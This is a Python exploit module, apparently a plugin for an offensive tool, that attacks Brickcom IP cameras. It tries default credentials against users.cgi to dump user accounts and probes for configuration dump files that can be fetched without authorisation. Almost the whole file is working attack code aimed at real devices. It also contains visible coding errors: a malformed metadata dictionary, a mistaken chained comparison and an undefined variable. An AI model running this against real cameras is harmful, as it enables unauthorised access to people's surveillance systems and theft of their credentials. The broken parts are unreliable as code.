Description = 'Exploits all Brickcom vulnerabilities'
from plugin_support import *

info = {
        'name': 'Exploits all Brickcom vulnerabilities',
        'description': 'Exploit implementation for miscellaneous Brickcom cameras with "users.cgi".'
                        'Allows remote credential disclosure by low-privilege user. &&',
                        'Module exploits Brickcom Corporation Network Camera Configuration Dislosure vulnerability. If target is vulnerable.'
        'authors': [
            'Ryan0x1 <@Ryan0x1>'
        ],
        'references': [
            'https://www.exploit-db.com/exploits/42588/',
            'https://www.brickcom.com/news/productCERT_security_advisorie.php',
            'https://www.exploit-db.com/exploits/39696/'
        ],
        'devices': [
            'Brickcom FB-100Ae IP Box Camera - Firmware Version: v3.0.6.12 (release:09/08/2010 14:46)',
            'Brickcom WCB-100Ap Wireless Camera - Firmware Version: v3.0.6.26 (release:01/21/2011 18:31)',
            'Brickcom VD-202Ne Vandal Dome Camera - Firmware Version: v37019_Promise (release:2015-10-01_18:46:07)',
            'Brickcom VD-300Np Vandal Dome Camera - Firmware Version: v3.7.0.23T (release:2016-03-21_10:08:24)',
            'Brickcom VD-E200Nf Vandal Dome Camera - Firmware Version: v3.7.0.5T (release:2015-06-25_11:18:07)',
            'Brickcom OB-202Ne Bullet Camera - Firmware Version: v3.7.0.18R (release:2015-09-08_18:40:11)',
            'Brickcom OB-E200Nf Bullet Camera - Firmware Version: v3.7.0.18.3R (release:2015-10-16_11:36:46)',
            'Brickcom OB-200Np-LR Bullet Camera - Firmware Version: v3.7.0.18.3R (release:2015-10-15_11:30:46)',
            'Brickcom OB-500Ap Bullet Camera - Firmware Version: v3.7.0.1cR (release:2016-01-18_10:07:03)',
            'Brickcom GOB-300Np Bullet Camera (Unique Series) - Firmware Version: v3.7.0.17A (release: 2015-07-10_11:36:41)',
            'Brickcom OB-200Np-LR Bullet Camera (Unique Series) - Firmware Version: v3.7.0.18.3R (release: 2015-10-15_11:30:46)',
            'Brickcom MD-300Np Mini Dome Camera - Firmware Version: v3.2.2.8 (release:2013-08-01)',
            'Brickcom CB-102Ae V2 Cube Camera - Firmware Version: v3.0.6.12 (release: 09/07/2010 11:45)',
            'Brickcom FD-202Ne Fixed Dome Camera - Firmware Version:v3.7.0.17R (release: 2015-08-19_18:47:31)',
            'Brickcom WCB-040Af',
            'Brickcom WCB-100A',
            'Brickcom WCB-100Ae',
            'Brickcom OB-302Np',
            'Brickcom OB-300Af',
            'Brickcom OB-500Af'
        ],
    }

init = {
    'target':ask.target,
    'RPORT':ask.RPORT
}

def run():
    global init
    import requests, re
    from requests.auth import HTTPBasicAuth

    #/* Start login exposure attack. */
    headers = {
        'User-Agent':'Mozilla/5.0 (X11; Linux x86_64; rv:62.0) Gecko/20100101 Firefox/62.0',
        'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
    }

    check = requests.get("http://" + init['target'] + ":" + init['RPORT'] + "/cgi-bin/users.cgi?action=getUsers", auth=HTTPBasicAuth("admin", "admin"), headers=headers)
    if "Unauthorized" in check.text:
        pass
    else:
        success("Target appears to be vulnerable")
        warning(check.text)
        exit()

    da = requests.get("http://" + init['target'] + ":" + init['RPORT'] + "/cgi-bin/users.cgi?action=getUsers", auth=HTTPBasicAuth("viewer", "viewer"), headers=headers)
    if "Unauthorized" in da.text == "401":
        pass
    else:
        success("Target appears to be vulnerable")
        warning(da.text)
        exit()

    ree = requests.get("http://" + init['target'] + ":" + init['RPORT'] + "/cgi-bin/users.cgi?action=getUsers", auth=HTTPBasicAuth("rviewer", "rviewer"), headers=headers)
    if "Unauthorized" in ree.text == "401":
        pass
    else:
        success("Target appears to be vulnerable")
        warning(ree.text)
        exit()

    #/* Start configuration file dump exposure attack. */
    filer = requests.get("http://" + init['target'] + ":" + init['RPORT'] + "/configfile.dump?action=get")
    if filer.status_code == 401:
        pass
    else:
        success("Configuration file found here: " + "http://" + target + ":" + init['RPORT'] + "/configfile.dump?action=get")
    

    filerr = requests.get("http://" + init['target'] + ":" + init['RPORT'] + "/configfile.dump.backup")
    if filerr.status_code == 401:
        pass
    else:
        success("Configuration file found here: " + "http://" + target + ":" + init['RPORT'] + "/configfile.dump.backup")
    

    filerrr = requests.get("http://" + init['target'] + ":" + init['RPORT'] + "/configfile.dump.gz")
    if filerrr.status_code == 401:
        pass
    else:
        success("Configuration file found here: " + "http://" + target + ":" + init['RPORT'] + "/configfile.dump.gz")

    filerrrr = requests.get("http://" + init['target'] + ":" + init['RPORT'] + "/configfile.dump")
    if filerrrr.status_code == 401:
        pass
    else:
        success("Configuration file found here: " + "http://" + init['target'] + ":" + init['RPORT'] + "/configfile.dump")
